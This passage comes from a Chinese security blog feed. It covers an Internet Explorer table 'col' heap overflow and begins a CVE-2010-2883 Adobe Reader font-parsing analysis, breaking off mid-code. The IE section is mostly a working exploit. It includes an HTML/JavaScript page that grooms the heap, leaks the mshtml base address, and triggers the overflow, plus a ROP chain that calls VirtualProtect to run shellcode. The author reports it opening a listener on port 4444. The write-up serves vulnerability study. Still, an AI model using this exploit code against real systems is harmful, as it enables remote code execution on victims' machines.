class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __userpurge CTableColCalc::AdjustForCol(CTableColCalc *<span class="keyword">this</span>@&lt;ecx&gt;, <span class="keyword">const</span> struct CWidthUnitValue **a2@&lt;eax&gt;, <span class="keyword">const</span> struct CWidthUnitValue **a3@&lt;esi&gt;, <span class="keyword">const</span> struct CWidthUnitValue *a4, <span class="keyword">int</span> a5, struct CCalcInfo *a6, <span class="keyword">int</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ST04_4</span></span><br><span class="line"></span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*a2 &amp; <span class="number">0xF</span>;                 <span class="comment">// (unsigned int)*a2=04141149 </span></span><br><span class="line">  a3[<span class="number">6</span>] = *a2;</span><br><span class="line">  <span class="keyword">if</span> ( CUnitValue::IsScalerUnit(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    CUnitValue::SetValue((<span class="keyword">signed</span> <span class="keyword">int</span>)a4, (<span class="keyword">int</span> *)a3 + <span class="number">6</span>, <span class="number">8</span>);<span class="comment">// a3[6] = a3[6]*16|8</span></span><br><span class="line">    a3[<span class="number">1</span>] = a4;                                 <span class="comment">// a3[1]=00414114 </span></span><br><span class="line">    *a3 = a4;                                   <span class="comment">// *a3 = 00414114 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a6 != (struct CCalcInfo *)<span class="number">1</span> )</span><br><span class="line">      CUnitValue::SetPercent((CUnitValue *)<span class="number">0x64</span>, (<span class="keyword">int</span>)(a3 + <span class="number">6</span>));</span><br><span class="line">    *a3 = (<span class="keyword">const</span> struct CWidthUnitValue *)<span class="number">1</span>;</span><br><span class="line">    a3[<span class="number">1</span>] = *(<span class="keyword">const</span> struct CWidthUnitValue **)(a5 + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a3[<span class="number">2</span>] = a4;                                   <span class="comment">// a3[2]=00414114 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可能不够形象，直接贴图吧。<br><img src="http://static.zybuluo.com/dane909/pu038llh8yi6duts2vx0amgs/QQ%E6%88%AA%E5%9B%BE20180714153902.png" alt="QQ截图20180714153902.png-6.9kB"><br>实际上完成的功能可以用下面的伪代码表示(参考<code>KK</code>前辈的)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; SpanSum)</span><br><span class="line">&#123;</span><br><span class="line">CTableCol* theTableColObj = theTableLayoutObj-&gt;TableElementArray[i*<span class="number">4</span>]</span><br><span class="line"><span class="keyword">int</span> col_span = theTableColObj-&gt;GetAAspan(); <span class="comment">//获得 col 元素的 span 属性</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//判断 col 元素是否设置了 width 属性</span></span><br><span class="line"> <span class="keyword">if</span>(theTableColObj-&gt;CUnitValue::IsNullOrEnum())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;col_span; j++)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="keyword">int</span> cur_offset = (i + j) * <span class="number">0x1C</span></span><br><span class="line">AdjustForCol@CTableColCalc(&amp;ColTableLayoutBuffer[cur_offset],width)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i += col_span</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>漏洞很明显了，循环复制，但是后面明显超过了堆的开辟大小，造成溢出</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为存在 <code>ASLR</code> 和 <code>DEP</code> 保护，所以必须先泄露地址信息绕过 <code>ASLR</code>，之后通过构造 <code>ROP</code> 链绕过 <code>DEP</code>。</p><h3 id="win7-ie8"><a href="#win7-ie8" class="headerlink" title="win7+ie8"></a>win7+ie8</h3><p>泄漏地址信息的脚本如下。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"evil"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>  <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">strtoint</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> str.charCodeAt(<span class="number">1</span>)*<span class="number">0x10000</span> + str.charCodeAt(<span class="number">0</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> free = <span class="string">"EEEE"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( free.length &lt; <span class="number">500</span> ) free += free;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> string1 = <span class="string">"AAAA"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( string1.length &lt; <span class="number">500</span> ) string1 += string1;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> string2 = <span class="string">"BBBB"</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">while</span> ( string2.length &lt; <span class="number">500</span> ) string2 += string2;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> fr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> al = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> bl = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"evil"</span>);</span></span><br><span class="line"><span class="javascript">div_container.style.cssText = <span class="string">"display:none"</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="undefined">fr[i] = free.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">al[i] = string1.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="undefined">bl[i] = string2.substring(0, (0x100-6)/2);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="undefined">div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">200</span>; i&lt;<span class="number">500</span>; i+=<span class="number">2</span> ) &#123;</span></span><br><span class="line"><span class="javascript">fr[i] = <span class="literal">null</span>;</span></span><br><span class="line"><span class="undefined">CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> leak_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="javascript">leak_col.width = <span class="string">"41"</span>;</span></span><br><span class="line"><span class="javascript">leak_col.span = <span class="string">"19"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> str_addr = strtoint(bl[<span class="number">498</span>].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">11</span>,(<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">13</span>));</span></span><br><span class="line"><span class="undefined">str_addr = str_addr - 1410704;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"mshtml addr :"</span>+str_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">trigger_overflow</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> evil_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span></span><br><span class="line"><span class="javascript">evil_col.width = <span class="string">"1178993"</span>;</span></span><br><span class="line"><span class="javascript">evil_col.span = <span class="string">"44"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;leak()&#125;, <span class="number">300</span>);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;get_leak()&#125;,<span class="number">700</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">//setTimeout(function()&#123;heapspray()&#125;, 900);</span></span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;trigger_overflow()&#125;, <span class="number">1200</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>&lt;col id=&quot;132&quot; width=&quot;41&quot; span=&quot;9&quot; &gt;</code> 会建立 9个<code>0x1c</code>的堆块。之后定义三个长度为 <code>500</code> 的字符串。之后分配三个字符串数组<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">fr[i] = free.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">al[i] = string1.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">bl[i] = string2.substring(<span class="number">0</span>, (<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span><br><span class="line">div_container.appendChild(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后利用 <code>BSTR</code> 结构特性完成地址信息泄漏。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_leak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> str_addr = strtoint(bl[<span class="number">498</span>].substring((<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">11</span>,(<span class="number">0x100</span><span class="number">-6</span>)/<span class="number">2</span>+<span class="number">13</span>));</span><br><span class="line">    alert(<span class="string">"CButtonLayout addr :"</span>+str_addr.toString(<span class="number">16</span>));</span><br><span class="line">str_addr = str_addr - <span class="number">1410704</span>;</span><br><span class="line">alert(<span class="string">"mshtml addr :"</span>+str_addr.toString(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_overflow</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> evil_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">evil_col.width = <span class="string">"1178993"</span>;</span><br><span class="line">evil_col.span = <span class="string">"44"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如下图，成功覆盖 <code>BSTR</code> 的长度，之后通过 <code>CButtonLayout</code> 的虚表地址算出 <code>mshtml</code> 的加载基址。<br><img src="http://static.zybuluo.com/dane909/hnap02gjsixvxtm5hctl8j7h/QQ%E6%88%AA%E5%9B%BE20180714180455.png" alt="QQ截图20180714180455.png-12kB"><br>这个和书上不一样的是用的开头四字节的虚表地址来计算偏移，不过不重要，结果都一样。<br><img src="http://static.zybuluo.com/dane909/shl502u8mkftgp93pafmm0l7/QQ%E6%88%AA%E5%9B%BE20180714184432.png" alt="QQ截图20180714184432.png-17.3kB"><br>之后就可以利用泄露出来的 <code>mshtml</code> 地址构造 <code>rop</code> , 绕过 <code>DEP</code>。<br><img src="http://static.zybuluo.com/dane909/z9s7gej7kf045psmj11ln75p/2018-07-14_184651.png" alt="2018-07-14_184651.png-164.4kB"><br>后面利用就是先栈劫持到堆上，之后 <code>VirtualProtect</code> 函数修改内存的可执行性，再控制 <code>eip</code> 到堆上已经布置好的 <code>shellcode</code>。<code>rop</code> 的构造如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop1+<span class="string">"%u"</span>+rop2); <span class="comment">// RET</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop5+<span class="string">"%u"</span>+rop6); <span class="comment">// XCHG EAX,ESP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop3+<span class="string">"%u"</span>+rop4); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop7+<span class="string">"%u"</span>+rop8); <span class="comment">// POP EBP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u1024%u0000"</span>); <span class="comment">// Size 0x00001024</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop9+<span class="string">"%u"</span>+rop10); <span class="comment">// POP EDX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u0040%u0000"</span>); <span class="comment">// 0x00000040</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop11+<span class="string">"%u"</span>+rop12); <span class="comment">// POP ECX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+writable1+<span class="string">"%u"</span>+writable2); <span class="comment">// Writable Location</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop13+<span class="string">"%u"</span>+rop14); <span class="comment">// POP EDI</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop1+<span class="string">"%u"</span>+rop2); <span class="comment">// RET</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop15+<span class="string">"%u"</span>+rop16); <span class="comment">// POP ESI</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+jmpeax1+<span class="string">"%u"</span>+jmpeax2); <span class="comment">// JMP EAX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop17+<span class="string">"%u"</span>+rop18); <span class="comment">// POP EAX</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+vp1+<span class="string">"%u"</span>+vp2); <span class="comment">// VirtualProtect()</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop19+<span class="string">"%u"</span>+rop20); <span class="comment">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop21+<span class="string">"%u"</span>+rop22); <span class="comment">// PUSHAD</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u"</span>+rop23+<span class="string">"%u"</span>+rop24); <span class="comment">// PUSH ESP</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>); <span class="comment">// crap</span></span><br><span class="line">shellcode+= <span class="built_in">unescape</span>(<span class="string">"%u9090%u9090"</span>); <span class="comment">// crap</span></span><br></pre></td></tr></table></figure></p><p>给的资料里面有一个 <code>win7-ie-exp.html</code>,执行后会在 <code>4444</code> 端口监听，如下，成功执行。<br><img src="http://static.zybuluo.com/dane909/2t8u5e452lkff3ua3jsis5qe/QQ%E6%88%AA%E5%9B%BE20180714190405.png" alt="QQ截图20180714190405.png-37.5kB"></p><h3 id="win7-ie9-10-11"><a href="#win7-ie9-10-11" class="headerlink" title="win7+ie9/10/11"></a>win7+ie9/10/11</h3><p>上面说了<code>win7</code>下 <code>IE8</code> 浏览器的利用，在 <code>IE9</code> 及之后的浏览器中存在 <code>Nozzle</code> 保护机制，并且 <code>ie10</code> 之后 <code>BSTR</code> 分配在 <code>Custom Heap</code> 上，所以上面的利用方法并不适合。</p><blockquote><p>Nozzle保护机制（IE）：检测是否存在重复可转换成汇编代码的字段，若存在则阻止其内存申请。</p></blockquote><p><img src="http://static.zybuluo.com/dane909/l4sz0odv1iecxzddjmtcmg3x/QQ%E6%88%AA%E5%9B%BE20180715134938.png" alt="QQ截图20180715134938.png-137.6kB"></p><p><code>Nozzle</code> 并不检测 <code>VBScript</code>的执行，所以可以利用其绕过，<code>VBArray</code> 的 <code>toArray()</code> 可以堆上分配正常的 <code>BSTR</code> 对象。<br>参考:<a href="https://github.com/k33nteam/IE9-IE11-Vulnerability-Advanced-Exploitation/blob/master/Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013.pdf" target="_blank" rel="noopener">Study-of-Exploit-Migitation-in-Modern-Browsers-KEENTeam-XCON2013</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从备份失败的老博客还原出来的&lt;br&gt;
    
    </summary>
    
    
      <category term="old_blog" scheme="https://vsane.github.io/tags/old-blog/"/>
    
      <category term="browser" scheme="https://vsane.github.io/tags/browser/"/>
    
      <category term="vuln" scheme="https://vsane.github.io/tags/vuln/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883</title>
    <link href="https://vsane.github.io/2019/01/09/CVE-2010-2883/"/>
    <id>https://vsane.github.io/2019/01/09/CVE-2010-2883/</id>
    <published>2019-01-09T07:40:08.000Z</published>
    <updated>2019-01-09T09:26:37.693Z</updated>
    
    <content type="html"><![CDATA[<p>从备份失败的老博客还原出来的<br><a id="more"></a></p><h2 id="漏洞概览"><a href="#漏洞概览" class="headerlink" title="漏洞概览"></a>漏洞概览</h2><p>本来想通过 <code>poc</code> 样本去定位漏洞地址，后来发现找的样本都无法定位到，感觉是我操作有问题，总是蹦出来异常处理，算了，就用泉哥用的上帝视角模式吧，直接通过漏洞点进行分析。<br><img src="http://static.zybuluo.com/dane909/ifewcvpsv7pzzuu009nwg55x/QQ%E6%88%AA%E5%9B%BE20180708170440.png" alt="QQ截图20180708170440.png-65.4kB"><br>漏洞点在<code>0x803ddab</code> 处，在调用 <code>strcat</code> 函数时没有对长度检查，造成溢出，并且有程序上下文可以猜测是在对字体处理时出现了问题。下面会详细分析这个漏洞是如何触发的，在分析之前需要先简单了解下 <code>pdf</code> 文件的结构，可以参考:<a href="https://zhuanlan.zhihu.com/p/30597307" target="_blank" rel="noopener">PDF文件解析与PDF恶代分析中的一些坑</a></p><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><p>我使用的样本是 <code>msf</code> 生成的可以弹出计算机的，原理都一样。先来了解下 <code>TTF</code> 字体的一些信息。<br>首先是 <code>tOffsetTable</code> 记录了表结构的信息，可以理解为一个总表吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tOffsetTable</span> &#123;</span></span><br><span class="line">TT_Fixed SFNT_Ver;<span class="comment">//sfnt version 0x00010000 for version 1.0. </span></span><br><span class="line">USHORT  numTables;<span class="comment">//Number of tables.  </span></span><br><span class="line">USHORT  searchRange;<span class="comment">//(Maximum power of 2 &lt;= numTables) x 16. </span></span><br><span class="line">USHORT  entrySelector;<span class="comment">// Log2(maximum power of 2 &lt;= numTables). </span></span><br><span class="line">USHORT  rangeShift;<span class="comment">// NumTables x 16-searchRange. </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>然后是 <code>tTable</code> 结构体，记录了相关表的偏移及大小。实际存储的时候会是一个数组，因为存了很多表，之后就是各个表的具体内容。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tTable</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">char</span> asChar[<span class="number">4</span>];<span class="comment">// 4 -byte identifier. </span></span><br><span class="line">ULONG asLong;</span><br><span class="line">&#125; Tag;</span><br><span class="line">ULONG checkSum;<span class="comment">// CheckSum for this table. </span></span><br><span class="line">ULONG offset;<span class="comment">// Offset from beginning of TrueType font file. </span></span><br><span class="line">ULONG length;<span class="comment">// Length of this table. </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以通过 <code>010editor</code> 的模板功能进行查看，如下(字体数据结构是通过 <code>PdfStreamDumper</code>得到的)<br><img src="http://static.zybuluo.com/dane909/7anwbklc7e552lkdj6lg24lj/20180708185531.png" alt="20180708185531.png-27.6kB"><br><br><br><code>SING</code> 的结构如下图:<br><img src="http://static.zybuluo.com/dane909/dwhnt7ch0zrnmufm416r773c/singtbl.png" alt="singtbl.png-111.1kB"><br><br><br><br><br>下面我们看下实验的样本中 <code>SING</code> 结构的数据<br><img src="http://static.zybuluo.com/dane909/srgdwjkvpt70qqmkbsk8tn5a/123.png" alt="123.png-97.2kB"><br>先来简单分析下漏洞点附近的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push    offset aSing    ; <span class="string">"SING"</span></span><br><span class="line">push    edi             ; <span class="keyword">int</span></span><br><span class="line">lea     ecx, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">call    sub_8021B06</span><br><span class="line">mov     eax, [ebp+<span class="number">108</span>h+var_12C]</span><br><span class="line">cmp     eax, esi</span><br><span class="line">mov     byte ptr [ebp+<span class="number">108</span>h+var_10C], <span class="number">2</span></span><br><span class="line">jz      <span class="keyword">short</span> loc_803DDC4</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line"><span class="keyword">and</span>     ecx, <span class="number">0F</span>FFFh</span><br><span class="line">jz      <span class="keyword">short</span> loc_803DD9F</span><br><span class="line">cmp     ecx, <span class="number">100</span>h</span><br><span class="line">jnz     <span class="keyword">short</span> loc_803DDC0</span><br><span class="line">add     eax, <span class="number">10</span>h</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">lea     eax, [ebp+<span class="number">108</span>h+var_108]</span><br><span class="line">push    eax             ; <span class="keyword">char</span> *</span><br><span class="line">mov     [ebp+<span class="number">108</span>h+var_108], <span class="number">0</span></span><br><span class="line">call    <span class="built_in">strcat</span></span><br></pre></td></tr></table></figure></p><p>先看第一个函数 <code>sub_8021B06(ecx, edi, str_SING);</code>, 第一个参数是一个对象，但是现在并不能确定这个函数的作用，可以通过 <code>windbg</code> 加断点比较前后数据的变化来猜测。<br>先看下在函数执行前<br><img src="http://static.zybuluo.com/dane909/5be8yjsxc24i2hnrroknmwkc/QQ%E6%88%AA%E5%9B%BE20180708194913.png" alt="QQ截图20180708194913.png-125.5kB"><br>执行函数后再一次进行比较，可以猜到函数的作用是根据存储 <code>TTF</code> 数据的地址找到 <code>SING</code> 表结构的地址。<br><img src="http://static.zybuluo.com/dane909/ueskqxzz6c6mafr21yfvip08/QQ%E6%88%AA%E5%9B%BE20180708195541.png" alt="QQ截图20180708195541.png-139.6kB"><br>所以后面指令的作用基本就得到了，如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 